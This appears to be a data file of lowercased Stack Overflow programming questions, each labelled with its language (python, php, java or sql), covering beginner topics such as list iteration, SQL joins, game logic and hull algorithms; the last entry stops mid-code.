python - zip (skip over an element from one list but not from other)  i ve 2 list  <code>a</code> and <code>b</code>. lets say <code>len(a)</code> = <code>len(b) + 1</code>. i want to iterate over both the list simultaneously  with a condition. since  <code>a</code> has extra garbage value  it should skip that value from <code>a</code>  but it shouldnt skip the value from <code>b</code>. then when next iteration  happen  <code>a</code> should start from next element and <code>b</code> front the same initial element.    explaination in the example.   <pre><code>a = [1 2 3 4 5 6 19 20] b = [7 8 9 10 11 17 18]  for x y in zip(a b):     if x == 5: # some condition         #in this case y is 11         continue # skip the value 5 from a but dont skip 11 from b.     print x y </code></pre>   the expected output will be   <pre><code>1 7 2 8 3 9 4 10 6 11 # 5 skipped because of some condition  but 11 remains intact 19 17 20 18 </code></pre>   how can i do it     <strong>or</strong> if theres any other solution while iterating simultaneously  please let me know.,python

calculate average in php eliminating those data which screw up all average  i want to calculate average of time spent on each task    but while calculating the average i dont want to count those time for average which is taking very long amount of time.    lets say we have <strong>5 task</strong>:    <strong>task 1</strong> takes <strong>500</strong> seconds<br/> <strong>task 2</strong> takes <strong>300</strong> seconds<br/> <strong>task 3</strong> takes <strong>4000</strong> seconds<br/> <strong>task 4</strong> takes <strong>450</strong> seconds<br/> <strong>task 5</strong> takes <strong>500</strong> seconds<br/>    if we calculate the <strong>average</strong> the result will be <strong>1150</strong> seconds.    but i want to eliminate those data from average calculation due to which the average is screwed up (4000 in this example). the reason for this is it may be possible that we don t have enough resource to complete the task at that time and taking longer because we are waiting for that resource.,php

when key pressed if timer>500  do something  i m working on a small project where i want to be able to call a method by pressing a key. i only want the method to be able to be called every 1/2 second. is there a way i can set up a timer to keep track of how long since a key was pushed and then reset it after every time the method is called  here s kinda the idea in pseudocode   <pre><code>public class checker{    public checker(x){       timer t=new timer(x);       t.start();       int i=1;       while(i=1){          if(keypressed.k &amp;&amp; t&gt;500){             //call method          }       t.restart();       } </code></pre>   do you guys think this is the best way to go about it  and would it be possible for my program to do other things while this is active or would it just be stuck in the loop,java
combining data from two tables into one row  i ve read around quite a bit for a solution to my problem but i can t seem to get it to work. it seems like a simple problem but i m not getting the result set i want.    i m working on a report that needs to pull from two tables and essentially create one row of data for each employee. the file needs to be uploaded to a healthcare vendor.    here is an example of the data    table1: employeecheckdeduction   <pre><code>employee id  deduction amount  check date        1234             50.00   6/30/2015        1234             50.00   7/15/2015        4567            100.00   6/30/2015        4567            100.00   7/15/2015        9876             75.00   6/30/2015        9876             75.00   7/15/2015 </code></pre>   table2: employercontribution   <pre><code>employee id  contribution amount  check date        1234                25.00   6/30/2015         1234                30.00   7/15/2015        4567                50.00   6/30/2015        4567                60.00   7/15/2015 </code></pre>   part of the problem is that not every record in table1 will have a corresponding match in table 2. if they are maxed out on contributions  they won t receive one on that pay. what i want is a result set that looks like this:   <pre><code>employee id  deduction amount  contribution amount  check date        1234             50.00                25.00   6/30/2015        1234             50.00                30.00   7/15/2015         4567            100.00                50.00   6/30/2015        4567            100.00                60.00   7/15/2015        9876             75.00                 0.00   6/30/2015        9876             75.00                 0.00   7/15/2015 </code></pre>   no matter how i try and join  it s just duplicating data. i ve tried using subqueries or distinct records and no matter what i try  it s not giving me what i want. i can t figure out what i m doing wrong.    edit. see links below for dataset results.    <a href= http://s000.tinyupload.com/index.php file_id=01551050904538574848  rel= nofollow >http://s000.tinyupload.com/index.php file_id=01551050904538574848</a>    <a href= http://s000.tinyupload.com/index.php file_id=63978789937644749322  rel= nofollow >http://s000.tinyupload.com/index.php file_id=63978789937644749322</a>    <a href= http://s000.tinyupload.com/index.php file_id=28700836121558977952  rel= nofollow >http://s000.tinyupload.com/index.php file_id=28700836121558977952</a>    i think part of the problem is that in the employee check deduction table there is a specific deduction code that i m pulling out. in the employer deduction table that code also exists. however  whenever i try and add the join on those 2 fields in addition to employee id and check date  it doesn t return results from the employees who have a deduction amount in the employee check deduction table when they don t have a corresponding record in the employer contribution table. i hope that helps.,sql

what is this syntax called  `new type() { ... }`  i know that java will let you do trickery with a variable s type when initializing a class variable. along the lines of:   <pre><code>sometype foo = new sometype() {     {         this.foofield = 12345;     }     @override public void somemethod() {         throw new reallyweirdexception();     } }; </code></pre>   which will create an instance variable <code>foo</code> where <code>somemethod()</code> has different semantics than in the usual <code>sometype</code>  and where <code>foofield</code> is initialized to a value other than its normal default.    but what is the <code>new type() { ... }</code> syntax called,java
confusion with a while statement evaluating if a number is triangular  i ve been having troubles trying to figure out how to solve a function. i ve been assigned the development of a little programme which tells if a number is  triangular  (a number is triangular when the addition of certain consecutive numbers in the [1 n] interval is n. following the definition  the number 10 is triangular  because in the [1 10] interval  1+2+3+4=10).    i ve coded this so far:   <pre><code>class triangularnumber{    boolean numtriangular(int n) {     boolean triangular = false;     int i = n;     while(n&gt;=0 &amp;&amp; triangular){     //ue06 is a class which contains the function  f0   which makes the addition of all the numbers in a determined interval     ue06 p = new ue06();       if ((p.f0(1  i))==n)         triangular = true;       else         i=i-1;     }     return triangular;   }  boolean testtriangular = numtriangular(10) == true &amp;&amp;    numtriangular(7) == false &amp;&amp;    numtriangular(6) == true;    public static void main(string[] args){      triangularnumber p = new triangularnumber();     system.out.println( testtriangular =   + p.testtriangular);    }  } </code></pre>   according to those boolean tests i made  the function is wrong. as i see the function  it goes like this:    <ol> <li>i state that the input number in the initial state isn t triangular (triangular=false) and i=n (determining the interval [1 i] where the function is going to be evaluated</li> <li>while n is greater or equals 0 and the number isn t triangular  the loop starts</li> <li>the loop goes like this: if the addition of all the numbers in the [1 i] interval is n  the number is triangular  causing the loop to end. if that statement is false  i goes from i to (i-1)  starting the loop again with that particular interval  and so on till the addition is n.</li> </ol>   i can t spot the error in my  algorithm   any advice     thanks!,java
python - command line closes  i m having a bit of fun with python creating classes and methods and stuff but i have one problem.    say i have this code:   <pre><code>class circle:     def __init__(self  radius):         self.radius = radius      def increaser(self):         self.radius += 1 </code></pre>   the code itself runs perfectly fine. but when i run the .py file  it runs it through the shell (i think that s what it s called)  then it closes it. while i realize that this is completely normal to happen  i was wondering how i could keep it open so someone can toy around with the program and do stuff like:   <pre><code>c = circle(1) c.radius c.increaser </code></pre>   basically play around with the class and get output from the shell. but it closes too fast  and i don t want to have to run it from my ide every time (where the shell stays open).    basically i want the shell to stay open and keep taking input from the user until you literally click the red x on the shell window.    sorry if i sound dumb  i just started python programmming.    thank you!    bella,python

improving newton s method recursion  i have solved a previous problem and now i am stuck with this one.  it is asking for an improvement of the previous solution which i posted below  but can t quite understand what the problem is asking. (also  can t really figure out how to solve it.)  please help  thanks.    problem: elena complains that the recursive newton function in project 2 includes an extra argument for the estimate. the function’s users should not have to provide this value  which is always the same  when they call this function. modify the definition of the function so that it uses a keyword parameter with the appropriate default value for this argument  and call the function without a second argument to demonstrate that it solves this problem.    here is my code:   <pre><code>def newtonsquare(x  estimate):     if abs(x-estimate ** 2) &lt;= 0.000001:         return estimate     else:         return newtonsquare(x  (estimate + x / estimate) / 2)  def main():     num = int(raw_input( enter a positive number &gt;&gt;  ))     print newtonsquare(num  1.0)  main() </code></pre>,python

grabbing images from a website  i wonder if anyone can point me in the right direction.    i have a rather large spreadsheet of product info that needs plugging into a shop. the tricky bit is that the spreadsheet has a link which points to the relevant page on another site which has the products details  and what i need to do is grab that relevant image and save locally  so i can use later.the reason why im thinking down this line is there are 7500 products....    my friend suggested i could maybe use php &amp; filepopen.    the image does have an outer tag id which i can refer to.    i was thinking of iterating through the spreadsheet this is the type of link i have to work with    <a href= http://www.apc.com/resource/include/techspec_index.cfm base_sku=apcrbc105  rel= nofollow >http://www.apc.com/resource/include/techspec_index.cfm base_sku=apcrbc105</a>    the images themselves are called something random  but i figured i could rename them as i grab them to the more relevant sku number.   <ul> <li>so iterate through the spreadsheet by sku number</li> <li>identify the image by the relevant id on the page (i m assumming it s in the same place     on every page)</li> <li>save the image while renaming to the correct sku number</li> </ul>   any ideas on how i could go about this   the thought of visiting each page manually and saving the image 7500 times doesn t seem the best way forward!    thanks for looking,php

selecting value from different schema  i m a complete and total newb at sql. i know how to correlate data between tables  but that s pretty much it (and then  only if i have gui...). i am attempting to write some automated tests for a site we are working on.    the project i m working on contains 2 schema for users that register to the site. from time to time  we use the other  for  private  users. when they register  the users that go to the  private  site also go in the second schema.     basically  during the writing of my tests  whenever i need a registration token from the default schema  i use this sql command in my tests (which i write using java code):   <blockquote>    select tokenvalue from tokens where typeoftoken =  registration  and user_id =  48   </blockquote>   this works without problems  since the default schema is already specified elsewhere.    is there a way for me to specify from which schema i need to select the token from     thank you.,sql

writing a tic tac toe program  but the output isn t what it should be  could anyone help   to explain what i m doing  i m basically taking a string of x s and o s as an input string  converting it to an array  so xxxoxoxoo as the input would be the same array. then i m checking each possible scenario where one could win  coordinate wise  and if it matches it through if statements it returns the number corresponding to who won.    but it s not quite working  haha. it seems to only output o as the winner  in clear cases where x should win.    could anyone lend a hand  much appreciated in advance  thanks.   <pre><code>import java.util.scanner; public class tictactoe {     public static void main(string[] args) {          scanner keyboard = new scanner(system.in);          system.out.println( type in a board for analysis );         string b = keyboard.nextline();          drawboard(b);          int result = decide(b);          if (result == 1) {             system.out.println( win for x );         }         else if (result == 0) {             system.out.println( win for o );         }         else if (result == 3)  {             system.out.println( draw );         }         else {             system.out.println( game unfinished );         }    }      public static int decide(string scheme) {         int decision = 0;          string boardscheme[] = new string[9];          for (int i = 0; i &lt; 9; i++) {             boardscheme[i] = scheme.substring(i i+1);         }          if ((boardscheme[0] == boardscheme[1] &amp;&amp; boardscheme[0] == boardscheme[2]) || (boardscheme[0] == boardscheme[3] &amp;&amp; boardscheme[0] == boardscheme[6]) || (boardscheme[0] == boardscheme[4] &amp;&amp; boardscheme[0] == boardscheme[8])) {             if (boardscheme[0] ==  x ) {                 decision = 1;             }             else {                 decision = 0;             }         }         else if (boardscheme[3] == boardscheme[4] &amp;&amp; boardscheme[3] == boardscheme[5]) {             if (boardscheme[3] ==  x ) {                 decision = 1;             }             else {                 decision = 0;             }         }         else if (boardscheme[6] == boardscheme[7] &amp;&amp; boardscheme[6] == boardscheme[8]) {             if (boardscheme[6] ==  x ) {                 decision = 1;             }             else {                 decision = 0;             }         }         else if (boardscheme[1] == boardscheme[4] &amp;&amp; boardscheme[1] == boardscheme[7]) {             if (boardscheme[1] ==  x ) {                 decision = 1;             }             else {                 decision = 0;             }         }         else if ((boardscheme[2] == boardscheme[5] &amp;&amp; boardscheme[2] == boardscheme[8]) || (boardscheme[2] == boardscheme[4] &amp;&amp; boardscheme[2] == boardscheme[6])) {             if (boardscheme[2] ==  x ) {                 decision = 1;             }             else {                 decision = 0;             }         }          return decision;     }      public static void drawboard(string scheme) {         if (scheme.length() == 9) {             string board[] = new string[9];              for (int i = 0; i &lt; 9; i++) {                 board[i] = scheme.substring(i i+1);             }              system.out.println(board[0] +   |   + board[1] +   |   + board[2]);             system.out.println(board[3] +   |   + board[4] +   |   + board[5]);             system.out.println(board[6] +   |   + board[7] +   |   + board[8]);         }         else {             system.out.println( please input 9 characters  no more  no less. );         }     } } </code></pre>,java

storing data input by the user  i m having trouble coming up with a way to store information i want to get from a user and then return those same stats at the end of the method. the problem in question is to repeatedly ask the user to name animals and how many of said animals remain in the wild. i then want my program to store these inputs without creating a few hundred variables (the problem in question) and then print the least endangered animal when the loop is terminated.    if what i m asking is unclear  here is the fragment of code that is causing me trouble:   <pre><code>while (!animals.equalsignorecase( exterminate ))  {     animals = input( name an animal );     if (animals.equalsignorecase( exterminate ))     {      print( the least endangered animal is   + animals);      print( there are still   + numberanimals +   left in the wild );      break;     }     else     {      remaining = input( how many are left in the wild  );      numberanimals = integer.parseint(remaining);     }     } </code></pre>   i am aware that arrays are likely to solve this problem but i don t understand how i would implement one into the while loop.    edit: the essence of my problem is trying to find a way to print the least endangered animal at the end of the loop because  as it stands  the terminate code  exterminate  gets printed instead of the animal,java
is there a better reference container than a one-element array   a java anonymous class can only access a variable from the surrounding method if that variable is <code>final</code>  and hence the inner class can t write to that variable. in order to capture an object created by an enclosed type  i ve created a <code>final</code> single-element array to act as a reference:   <pre><code>    final string[] ref = new string[1];     final runnable runnable = new runnable() {         public void run() {             ref[0] =  hello world ;         }     };      runnable.run();     system.out.println(ref[0]); </code></pre>   this appears to work  and i imagine has good performance. but it feels slightly hacky.    obviously it is trivial to write a <code>ref</code> class to replace this such that:   <pre><code>    final ref&lt;string&gt; ref = new ref&lt;&gt;();     final runnable runnable = new runnable() {         public void run() {             ref.set( hello world );         }     };      runnable.run();     system.out.println(ref.get()); </code></pre>   ... is there an existing class in the standard java runtime that does this      i ve looked at <code>java.lang.ref.reference</code>  and this isn t the same thing. these are immutable  the only implementations are for weak/phantom references.,java

id fields in sql tables: rule or law   just a quick database design question: do you always use an id field in every table  or just most of them   clearly most of your tables will benefit  but are there ever tables that you might not want to use an id field       for example  i want to add the ability to add tags to objects in another table (foo).  so i ve got a table footag with a varchar field to hold the tag  and a fooid field to refer to the row in foo.  do i really need to create a clustered index around an essentially arbitrary id field   wouldn t it be more efficient to use fooid and my text field as the clustered index  since i will almost always be searching by fooid anyway   plus using my text in the clustered index would keep the data sorted  making sorting easier when i have to query my data.  the downside is that inserts would take longer  but wouldn t that be offset by the gains during selection  which would happen far more often     what are your thoughts on id fields   bendable rule  or unbreakable law     edit: i am aware that the example provided is not normalized.  if tagging is to be a major part of the project  with multiple tables being tagged  and other  extras   a two-table solution would be a clear answer.  however in this simplest case  would normalization be worthwhile   it would save some space  but require an extra join when running queries,sql

the straw picking game: helping the computer learn from its  mistakes   so i have the game already programmed. you take turns against the computer picking 1-3 straws and the point of the game is to leave the opponent with 1 straw. that entire section works  but now i have to program the computer to get smarter through consecutive play.     i m not entirely sure how this is done  however. the way it was explained to me was that you have 4  cups   which i assume are arrays. each cup contains the moves  (1  2  3). during the computer s turn it randomly picks a cup and randomly chooses one of the three moves. if that move doesn t work then it removes it from the cup.    after several games the computer should become unbeatable.i m going to keep working on this but i m having a lot of trouble. i ve been at it for a couple hours now so i ll just post the raw code without my broken parts.    edit: i ve added the cup class at the bottom.   <pre><code>import java.util.*; public class nim {    public static void main(string[] args)    {   random r = new random();   scanner kb = new scanner(system.in);   string reply;    int straws  cupnum  prevcupnum  prevcomputermove         computermove  humanmove  gamenumber = 0  humanwin = 0;    // create an array of four cups   cup[] cup = new cup[4];   for (int i = 0; i &lt; cup.length; i++)      cup[i] = new cup();     system.out.println( let s play nim );   system.out.println();   do   {      gamenumber++;      straws = r.nextint(11) + 10;        // add 1 if necessary so computer nevers starts in losing config             if (straws%4 == 1)         straws++;      system.out.println( straws to start =   + straws);      system.out.println();       // set to -1 to indicate just starting so no previous move      prevcupnum = -1;      // no prev move so init to -1      prevcomputermove = -1;       do      {         cupnum = straws%4;   // get cup number          // if cup is empty  then use 1 for move         if (cup[cupnum].count() == 0)  // cup empty then move = 1            computermove = 1;            else            computermove = cup[cupnum].select(); // get move from cup            /*missing code         if cup is cup number 1  then remove the previous move         from the previous cup unless already empty*/          system.out.println            ( computer picks up   + computermove +   straws );         straws = straws - computermove;         if (straws &lt; 0)            straws = 0;         system.out.println(straws +   left );         system.out.println();          // save this move so it can be removed later if necessary         prevcupnum = cupnum;         prevcomputermove = computermove;          if (straws == 0)         {            system.out.println( wow.  you win! );            humanwin++;             /* missing code             remove last move computer made from cup*/         }         else  // get move from human         {            system.out.println();            do            {               system.out.print( your move: enter  );                if (straws == 1)                  system.out.println( 1 );               else               if (straws == 2)                  system.out.println( 1 or 2 );               else               if (straws &gt;= 3)                  system.out.println( 1  2  or 3 );                humanmove = kb.nextint();            } while               (humanmove &gt; 3 || humanmove &lt; 1 || straws - humanmove &lt; 0);             straws = straws - humanmove;            system.out.println(straws +   left );            if (straws == 0)            {                  system.out.println();               system.out.println( ha  ha.  you lose! );            }         }      } while (straws &gt; 0);        system.out.println         ( score: human   + humanwin +     computer   +           (gamenumber - humanwin));       if (kb.hasnextline())   // get rid of stray newline         kb.nextline();      system.out.println();      system.out.println( want to play another game   hit enter. );      system.out.println         ( or are you too chicken  in that case  type in quit. );      reply = kb.nextline();      reply = reply.trim();      if (reply.length() &gt; 4)  // require only 1st 4 to be quit         reply = reply.substring(0  4);   }  while (!reply.tolowercase().equals( quit ));    } public class cup {    arraylist&lt;integer&gt; c = new arraylist&lt;integer&gt;();     public cup()    {       c.add(1);       c.add(2);       c.add(3);    }    //-----------------------    public int count()    {       return c.size();    }    //-----------------------    public int select()    {       // random is a static method in math that returns a double       // value greater than or equal to 0.0 and less than 1.0.       int index = (int)(c.size()*math.random());       return c.get(index);    }    //-----------------------    public void remove(integer move)    {          c.remove(move);    } } </code></pre>,java
compare object to empty tuple with the  is  operator in python 2.x  i m used to seeing <code>if obj is none:</code> in python  and i ve recently come across  <code>if obj is ():</code>. since tuples are not mutable  it sounds like a reasonable internal optimization in the python interpreter to have the empty tuple be a singleton  therefore allowing the use of <code>is</code> rather than requiring <code>==</code>. but is this guaranteed somewhere  since which version of the interpreter     [edit] the question matters because if () is not a singleton and there is a way of producing an empty tuple with a different address  then using <code>is {}</code> is a bug. if it is only guaranteed since python 2.x with x > 0  then it is important to know the value of x if you need to ensure backward compatibility of your code. it is also important to know if this can break your code when using pypy / jython / ironpython...,python

a method for calculating the frequency of digits  i ve written a class that finds the total of an integer by adding up the two digits. for example the digit totals of <code>0  5  12  213  999 and 1111</code> are `0  5  3  6  27 and 4 respectively. i need to write a method:    <code>public static double digittotalfrequency(int max  int digittotal)</code>    this method should <code>return</code> the proportion of numbers which have the given <code>digittotal</code> of all numbers in the range 0  1...max. eg the <code>digittotalfrequency(9  3)</code> is <code>0.1</code> since only one number out of the first 10 numbers has a digit total of 3. also  <code>digittotalfrequency(99 3)</code> is <code>0.04</code> (since out of the first 100 numbers only the numbers 3  12  21  and 30 have a digittotal of 30). i am struggling to do this  help please  thank you.   <pre><code>public static double digittotalfrequency(int max  int digittotal){      int number = max;       while (number&gt;0) {         digittotal = digittotal + (number%10);         number = number/10;       }    return digittotal/max;  }  </code></pre>,java

navigation function in php using associative array  create an empty variable named output.  write a foreach loop for the nav_sections variable. with each iteration  append to the output variable a listitem <code>(&lt;li&gt;)</code> with a hyperlink contained within. the array key should be displayed as the clickable text ofthe hyperlink. the href attribute should contain a concatenation of url_root (constant) and the array item’s value. example: <code>&lt;li&gt;&lt;a href=”http://www.example.com/menu/”&gt;menu</code>     echo the output variable (this will echo the output in the place where the function is called).    this is what i have so far - is this correct  help me out here.   <pre><code>function main_nav() { $nav_sections= array(       home  =&gt;           menu  =&gt;  menu         members club  =&gt;  vip         about us  =&gt;  about         contact us  =&gt;  contact  );  $output =   ;  foreach($nav_sections as $key =&gt; $value) { $output =  &lt;li&gt; &lt;a href=   . url_root . $value   &gt;  . $key  &lt;/a&gt; &lt;/li&gt; ; }  echo $output;  } </code></pre>,php
global variable assignment issue  i have a problem with assigning global variable names inside a function. here s what the function looks like:   <pre><code>def nodegen(slabel  dlabel  sx  xy  dx  dy  num):    for i in range(1  num + 1):       label = slabel + (i - 1)*dlabel        global vars()[ n  + str(label)]       vars()[ n  + str(label)] = node(label  (sx + i*dx  sy + i*dy))       vars()[ n  + str(label)].info()    </code></pre>   actually  it s not important what the function does. what is important is that it generates a number num of objects. every one of them is assigned a variable n1  n2  ...  nnum (the indices do not necessarily have this sequence  it depends on the dlabel variable  but that s not really important). i want to make these variables global  so i can use them outside the function. the problem is line 4 of the code  since it seems the global statement doesn t work with the vars()[] statement. any ideas on how to solve this problem  i get an  invalid syntax  error message.    thanks in advance.,python

python and file input functions  here is the problem i m struggling with: two files named numbers1.txt and numbers2.txt both have an unknown number of lines  each line consisting of a single positive integer. write some code that reads a line from one file and then a line from the other file. the two integers are multiplied together and their product is added to a variable  called scalar_product which should be initialized to zero.    your code should stop when it detects end of file in either file that it is reading.    for example  if the sequence of integers in one file was  9 7 5 18 13 2 22 16  and  4 7 8 2  in the other file  your code would compute:    4*9 + 7*7 + 8*5 + 2*18    and thus store 161 into scalar_product.    current code:   <pre><code>number1 = open( numbers1.txt    r ) number2 = open( numbers2.txt    r ) scalar_product = 0 while number1.readline() !=    and number2.readline() !=   : product = int(number1.readline()) * int(number2.readline()) scalar_product += product number1.close number2.close </code></pre>,python

how to merge multiple java classes *at runtime*   say you have an application that defines an  entity  (interface) called a  with an accompanying aimpl. and you have third-party plugins that extends the class a into b  c  .. z (with bimpl  ...)  each adding some state and functionality. you also have a  factory  in your application that creates instances of a.    i would like my  user  to load several plugins at the same time  say f  k and w  such that the factory would than create a  super a  instance that would be at the same time a f  k and w. assuming that  interface  and  implementation  are strictly separated  as long as the  super a  implements the interface of f  k and w  it should not mater that it is neither a fimpl  kimpl or wimpl. so a kind of  runtime  multiple-inheritance.    to be precise  i would not have the source code of f  k or w  and the third-party developers should not need to know about each-others extensions.    so  is there some library that makes it easy to merge java classes  ideally with some way of managing  conflicts   for example two classes defining a private method with the same signature  or trying to override the same base-class method.    note: i m looking for something using bytecode manipulation  rather than composition. composition prevents the  extending  classes of overriding methods of the base class  and use-up more memory.    [edit] as i have explained in my comment to @gray  composition is not a good solution for a number of reasons. while you can use it  if you do it properly  you end-up with very many very small classes and interfaces  and a massive amount of glue code to make them look like just one single object. this also has  in addition to a large coding overhead resulting in decreased productivity  the effect that your application uses much more memory and is also a lot slower  due to the added indirections everywhere.    for an application that processes small and short db transactions  composition might be perfect  but for an application that has to keep gigabytes of hot data in ram at all times  which is what i will be doing  this has a very real cost  both in development time  and memory and cpu requirement for the clients and servers.    a solution where you can code  naturally  (interface-first style of programming is how i normally code anyway)  with some limitation on what methods from the base-class you can extend  would be much  cheaper  than composition.,java

java best way to generate a line of   *    i am currently trying to generate a line of 60 stars however i found several ways to do it.   <pre><code>//method 1 system.out.println(string.format( %60s     ).replace(      * ));  //method 2 for(int i=0;i&lt;60;i++)     system.out.print( * ); system.out.println(  );  //method 3 int i=0; while(i&lt;60) {     system.out.print( * );     i++; } </code></pre>   which is the best way to approach  (in terms of time and in terms of style)    and if there are any other methods to do this     <pre><code>//modular approach  not bad static string repeat(final string str  final int n) {     final int len = (str == null)   0 : str.length();     if (len &lt; 1 || n &lt; 1) {         return   ;     }     final stringbuilder sb = new stringbuilder(len * n);     for (int i = 0; i &lt; n; i++) {         sb.append(str);     }     return sb.tostring(); }  system.out.println(repeat( *   60)); </code></pre>   and    <pre><code>//similar to method 1 system.out.println(new string(new char[60]).replace( \0    * )); </code></pre>,java

count and group by semantics: why are these two different   so i m pretty new to sql and have the following two queries:   <pre><code>with contributions as (   select cc.cand_id  cc.cmte_id     from committee_contributions as cc     group by cc.cand_id  cc.cmte_id ) select c.cand_id  count(c.cand_id) as count   from contributions as c   group by c.cand_id    order by count desc </code></pre>   and    <pre><code>select cc.cand_id  count(cc.cmte_id) as count   from committee_contributions as cc   group by cc.cand_id   order by count desc </code></pre>   which give me two totally different outputs. from my understanding  the first one selects two columns and groups them by cand_id and then cmte_id  then counts the number of occurrences of each cand_id.the second one counts the number of cmte_id s associated with each cand_id. in my mind the second one should be the same as the first. could anyone enlighten me as to the difference     also  is there a better way to write the first statement without using the with or a nested query,sql

improve execution time of a procedure  i want your help in order to improve in time the following procedure in java. the procedure steps are the following:   <ul> <li>i have a table with more than a million records (primary key is auto increment).</li> <li>i select the min and max primary key value from this table.</li> <li>i create some initial  fromrange  and  torange  variables based on the min and max values</li> <li> after i create a loop where i process 20000 records each time:     i fetch the records between  fromrange  up to  torange     for each record return  i write (append each time) to an xml object (using jaxb)     after i write the xml object created on a file on a disk.    increase the  fromrange  and  torange  to continue to the next records.  </li> </ul>   procedure ends after all records have been process.    this execution takes more than 12 hours on a normal pc to finish. i was wondering how can i improve this code to export the files faster. maybe using threading     thanks,java
compare all possible combinations of pairs of elements in two arrays in php  i am trying to do basic binary line classification in php. (programming language irrelevant  just more comfortable with php).    so basically i have 2 arrays of coordinates:   <pre><code>$classa = [ new point(1 1)  new point(1 2)  new point(3 3)  new point(1 5) ]; $classb = [ new point(4 1)  new point(5 2)  new point(4 1)  new point(6 6) ]; </code></pre>   i need to iterate through these arrays and get 2 pairs of points each time (a pair consists of a point from classa and another from classb). it is important to get all possible combinations. once a particular point is in a pair  it cannot be present in another pair.     for example the first two pairs would be:   <pre><code>$pair1 = [$a[0]  $b[0]]; $pair2 = [$a[1]  $b[1]]; </code></pre>   to better explain myself  this is what i need:    <a href= https://i.stack.imgur.com/ekdre.png  rel= nofollow noreferrer ><img src= https://i.stack.imgur.com/ekdre.png  alt= enter image description here ></a>    when the first pair contains [1 1]   [4 1] all possibile combinations for the other pair are highlighted in yellow.    <a href= https://i.stack.imgur.com/4l9a0.png  rel= nofollow noreferrer ><img src= https://i.stack.imgur.com/4l9a0.png  alt= enter image description here ></a>    so far this is what i have:   <pre><code>$classa = [ new point(1 1)  new point(1 2)  new point(3 3)]; $classb = [ new point(4 1)  new point(5 2)  new point(4 1)];  $combinations = []; $pair1 = []; $pair2 = [];  $n = count($classa); $m = count($classb);  for ($i=0; $i&lt;$n; $i++){      for ($j=0; $j&lt;$m; $j++){          $pair1 = [ $classa[$i]  $classb[$j] ];          for ($z=0; $z&lt;$n; $z++){              if($z != $i &amp;&amp; $z != $j){                 for ($y=0; $y&lt;$m; $y++){                     if($y != $i &amp;&amp; $y != $j){                          $pair2 = [ $classa[$z]  $classb[$y] ];                         $combinations[] = [$pair1  $pair2];                      }                 }             }          }     } } </code></pre>   apart from being inefficient  this is giving me many duplicates  is there a way to only get unique combinations,php

issue with using double as value in hashmap  i have a <code>double</code> as the value in hashmap with the key as a string. if i update the variable that was added as a value to the hashmap independently  instead of updating it in the hashmap  the updated value does not get reflected. that is when i use the key to get the value i get the value as 0.0 instead of the updated value. i am not able to understand why this happens. please throw some light on this. also  is there some other way of updating the value in hashmap by updating the variable. a sample code of what i am talking about is below:    <pre><code>import java.util.hashmap; public class testdouble{     public double d1 = 0.0;     public double d2 = 0.0;     public double d3 = 0.0;     private hashmap&lt;string double&gt; hm;      public testdouble(){         hm = new hashmap&lt;string double&gt;();         hm.put( d1  d1);         hm.put( d2  d2);         hm.put( d3  d3);     }      public void updated1(double d){         d1 = d;     }      public void updated2(double d){         d2 = d;     }      public void updated3(double d){         d3 = d;     }     public double getvalue(string key){         double val = (double)hm.get(key);         return val;     }      public static void main(string args[]){         testdouble td =new testdouble();         td.updated1(10.10);         td.updated2(20.20);         td.updated3(30.30);         system.out.println( value of d1 from hashmap =  +td.getvalue( d1 )+  from actual variable =  +td.d1);         system.out.println( value of d2 from hashmap =  +td.getvalue( d2 )+  from actual variable =  +td.d2);         system.out.println( value of d3 from hashmap =  +td.getvalue( d3 )+  from actual variable =  +td.d3);     } } </code></pre>   the output i get is:   <pre><code>value of d1 from hashmap = 0.0 from actual variable = 10.1 value of d2 from hashmap = 0.0 from actual variable = 20.2 value of d3 from hashmap = 0.0 from actual variable = 30.3 </code></pre>,java

transmitting the correct session data when multiple tabs are opened on a web browser  i have a php script (<strong>script a</strong>) that makes a query to the database  stores the result in a session variable and produces a html page containing a form that allows the user to post a submission (<em>optionally</em>). upon submission  the result stored in the session variable is used for processing in another script (<strong>script b</strong>).    as the html page is not unique  the user may open multiple tabs showing different pages generated by <strong>script a</strong>. since the session variable can only hold data for the latest generated page  when the user clicks on any of the previous tabs and do a submission  the wrong set of session data will be used.    one way to preventing this from happening is to force the page to automatically reload before submission occurs. is there any better and <strong>secure</strong> way to do this short of re-querying the database in <strong>script b</strong>,php

randomizing decimal portion of a double  i have the following method which takes in gps coordinates as strings and converts them to doubles with a maximum of 6 decimal points. now i m trying to randomize the decimal points starting from the first decimal.   <pre><code>public void randomizecoordinate(string latstring  string lonstring) {     double lat = double.parsedouble(latstring);     double lon = double.parsedouble(lonstring);      decimalformat df = new decimalformat( #.###### );     df.setroundingmode(roundingmode.half_even);     for (number n : arrays.aslist(lat  lon))     {         double d = n.doublevalue();         system.out.println(df.format(d));     } } </code></pre>   for example if i have 2.34 i want the randomized to be something like 2.493473 or 2.294847 or 2.346758    the first decimal point in which in this case is 3 from 2.34 should only change a maximum of one digit. up or down randomly. the leading decimal points can change to anything in a random fashion.    what would be the best way of doing this,java

buying upgrades using different accumulated numbers of points  i am creating an incremental game like a cookie clicker... when the player has gained 20 points  they can buy a super click upgrade  which will then give them two points every time the button is clicked.  the next super click upgrade will cost 22 points  and give them 3 points per click. but in this case i manage to buy with 20 points  now it only buy the super click with 20 points continually but i want to switch to 22 points  what should do ... thanks,java

divide and conquer hull algorithm  hello my question today is to breakdown and figure out how to actually code the lower tangent part of the algorithm ive managed to complete steps (1) and (2) but i am now on stuck on step (3).    divide and conquer convex hull     hull(s) :     (1) if |s| &lt;= 3  then compute the convex hull by brute force in o(1) time and return.    (2) otherwise  partition the point set s into two sets a and b  where a consists of half the points with the lowest x coordinates and b consists of half of the points with the highest x coordinates.    (3) recursively compute ha = hull(a) and hb = hull(b).    (4) merge the two hulls into a common convex hull  h  by computing the upper and lower tangents for ha and hb and discarding all the points lying between these two tangents.    <a href= http://www.cs.wustl.edu/~pless/506/l3_1.gif  rel= nofollow >http://www.cs.wustl.edu/~pless/506/l3_1.gif</a>    <strong>finding the lower tangent</strong>    lowertangent(ha ; hb ) :    (1) let a be the rightmost point of ha .    (2) let b be the leftmost point of hb .    (3) while ab is not a lower tangent for ha and hb do    (a) while ab is not a lower tangent to ha do a = a - 1 (move a clockwise).    (b) while ab is not a lower tangent to hb do b = b + 1 (move b counterclockwise).    (4) return ab.    quoted from: <a href= http://www.cs.wustl.edu/~pless/506/l3.html  rel= nofollow >http://www.cs.wustl.edu/~pless/506/l3.html</a> this explanation is the best that describe my problem.    the functions for lexisort and convexhull have not been included as they are working  the dc hull algorithm has been included to provide context.    my current code:   <pre><code>public static int [][] dchull(int [][]merged){      